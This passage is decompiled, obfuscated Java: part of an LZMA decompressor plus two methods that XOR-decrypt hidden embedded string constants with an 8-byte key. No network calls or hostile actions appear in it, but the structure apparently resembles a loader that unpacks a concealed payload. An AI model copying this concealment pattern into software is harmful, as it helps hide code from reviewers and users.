                  } else {
                     var28 = var46 - 4;
                     l var40 = this;

                     for(var46 = 0; var28 != 0; --var28) {
                        var40.g >>>= 1;
                        var18 = var40.h - var40.g >>> 31;
                        var40.h -= var40.g & var18 - 1;
                        var46 = var46 << 1 | 1 - var18;
                        if ((var40.g & -16777216) == 0) {
                           var40.h = var40.h << 8 | var40.a();
                           var40.g <<= 8;
                        }
                     }

                     int var56 = var18 + (var46 << 4);
                     short[] var31 = this.h;
                     var40 = this;
                     short[] var48 = var31;
                     int var32 = 31 - a(var48.length);
                     var18 = 1;
                     int var52 = 0;

                     for(int var54 = 0; var54 < var32; ++var54) {
                        int var55 = var40.a((Object)var48, var18);
                        var18 = (var18 << 1) + var55;
                        var52 |= var55 << var54;
                     }

                     if ((var18 = var56 + var52) < 0) {
                        if (var18 != -1) {
                           return false;
                        }
                        break;
                     }
                  }
               } else {
                  var18 = var28;
               }
            }

            if ((long)var18 >= var10 || var18 >= this.p) {
               return false;
            }

            int var49 = var8;
            var12 = this;
            if ((var28 = this.c - var18 - 1) < 0) {
               var28 += this.d;
            }

            for(; var49 != 0; --var49) {
               if (var28 >= var12.d) {
                  var28 = 0;
               }

               var12.a[var12.c++] = var12.a[var28++];
               if (var12.c >= var12.d) {
                  var12.b();
               }
            }

            var10 += (long)var8;
            var8 = this.a((int)0);
         }
      }

      this.b();
      this.a();
      this.c = null;
      return true;
   }

   private static void d(Object var0) {
      short[] var2 = (short[])var0;

      for(int var1 = 0; var1 < var2.length; ++var1) {
         var2[var1] = 0;
      }

   }

   private static void e(Object var0) {
      short[][] var2 = (short[][])var0;

      for(int var1 = 0; var1 < var2.length; ++var1) {
         if (var2[var1] != null) {
            d(var2[var1]);
         }
      }

   }

   private void c() {
      byte[] var1 = this.a;

      for(int var2 = 0; var2 < var1.length; ++var2) {
         var1[var2] = 0;
      }

      this.c = 0;
      this.d = 0;
      this.e = 0;
      this.b = null;
      this.g = 0;
      this.h = 0;
      this.c = null;
      this.j = 0;
      this.k = 0;
      this.l = 0;
      e(this.a);
      d(this.a);
      d(this.b);
      d(this.b);
      d(this.c);
      d(this.d);
      d(this.e);
      d(this.f);
      e(this.b);
      d(this.g);
      d(this.h);
      d(this.i);
      e(this.c);
      e(this.d);
      d(this.j);
      this.m = 0;
      d(this.k);
      e(this.e);
      e(this.f);
      d(this.l);
      this.n = 0;
      this.o = 0;
      this.p = 0;
      this.q = 0;
   }

   public static byte[] b(byte[] var0) {
      l var1 = null;
      boolean var10 = false;

      label239: {
         byte[] var14;
         try {
            var10 = true;
            var14 = a((byte[])var0, 5);
            l var10000 = var1 = new l();
            byte[] var3 = var14;
            l var12 = var10000;
            boolean var35;
            if (var14.length < 5) {
               var35 = false;
            } else {
               int var4;
               int var5 = (var4 = var14[0] & 255) % 9;
               int var17;
               int var6 = (var17 = var4 / 9) % 5;
               var4 = var17 / 5;
               int var7 = 0;

               for(int var8 = 0; var8 < 4; ++var8) {
                  var7 += (var3[var8 + 1] & 255) << (var8 << 3);
               }

               l var15 = var12;
               if (var5 <= 8 && var6 <= 4 && var4 <= 4) {
                  l var20 = var12;
                  if (var12.a == null || var12.j != var5 || var12.k != var6) {
                     var12.k = var6;
                     var12.l = (1 << var6) - 1;
                     var12.j = var5;
                     var5 = 1 << var12.j + var12.k;
                     var12.a = new short[var5][];

                     for(int var30 = 0; var30 < var5; ++var30) {
                        var20.a[var30] = new short[768];
                     }
                  }

                  int var21 = 1 << var4;

                  for(var5 = var12.m; var5 < var21; ++var5) {
                     var15.c[var5] = new short[8];
                     var15.d[var5] = new short[8];
                  }

                  var15.m = var5;

                  for(var5 = var15.n; var5 < var21; ++var5) {
                     var15.e[var5] = new short[8];
                     var15.f[var5] = new short[8];
                  }

                  var15.n = var5;
                  var15.q = var21 - 1;
                  var35 = true;
               } else {
                  var35 = false;
               }

               if (!var35) {
                  var35 = false;
               } else if (var7 < 0) {
                  var35 = false;
               } else {
                  if (var12.o != var7) {
                     var12.o = var7;
                     var12.p = Math.max(var12.o, 1);
                     var6 = Math.max(var12.p, 4096);
                     if (var12.a == null || var12.d != var6) {
                        var12.a = new byte[var6];
                     }

                     var12.d = var6;
                     var12.c = 0;
                     var12.e = 0;
                  }

                  var35 = true;
               }
            }

            if (!var35) {
               throw new IllegalArgumentException();
            }

            long var16 = 0L;

            for(int var13 = 0; var13 < 8; ++var13) {
               int var26 = var0[var13 + 5] & 255;
               var16 |= (long)var26 << (var13 << 3);
            }

            var14 = new byte[(int)var16];
            if (!var1.a(var0, var14)) {
               var10 = false;
               break label239;
            }

            var10 = false;
         } finally {
            if (var10) {
               if (var1 != null) {
                  var1.c();
               }

            }
         }

         var1.c();
         return var14;
      }

      var1.c();
      return null;
   }

   private static byte[] a(long var0) {
      byte[] var2;
      (var2 = new byte[8])[0] = (byte)((int)(var0 >>> 56));
      var2[1] = (byte)((int)(var0 >>> 48));
      var2[2] = (byte)((int)(var0 >>> 40));
      var2[3] = (byte)((int)(var0 >>> 32));
      var2[4] = (byte)((int)(var0 >>> 24));
      var2[5] = (byte)((int)(var0 >>> 16));
      var2[6] = (byte)((int)(var0 >>> 8));
      var2[7] = (byte)((int)var0);
      return var2;
   }

   private static byte[] a(byte[] var0, int var1, int var2) {
      int var4;
      byte[] var3 = new byte[var4 = var2 - var1];
      System.arraycopy(var0, var1, var3, 0, Math.min(var0.length - var1, var4));
      return var3;
   }

   public static byte[] a(byte[] var0, int var1) {
      byte[] var2 = new byte[var1];
      System.arraycopy(var0, 0, var2, 0, Math.min(var0.length, var1));
      return var2;
   }

   public static byte[] a() {
      String var10000 = b;
      StringBuilder var0;
      (var0 = new StringBuilder()).append('\\');
      var0.append('b');
      byte[] var3 = a(var10000, var0.toString());
      byte[] var1 = a(b);

      for(int var2 = 0; var2 < var3.length; ++var2) {
         var3[var2] ^= var1[var2 % 8];
      }

      return var3;
   }

   public static byte[] b() {
      String var10000 = a;
      StringBuilder var0;
      (var0 = new StringBuilder()).append('\\');
      var0.append('c');
      byte[] var3 = a(var10000, var0.toString());
      byte[] var1 = a(a);

      for(int var2 = 0; var2 < var3.length; ++var2) {
         var3[var2] ^= var1[var2 % 8];
      }

      return var3;
   }
}
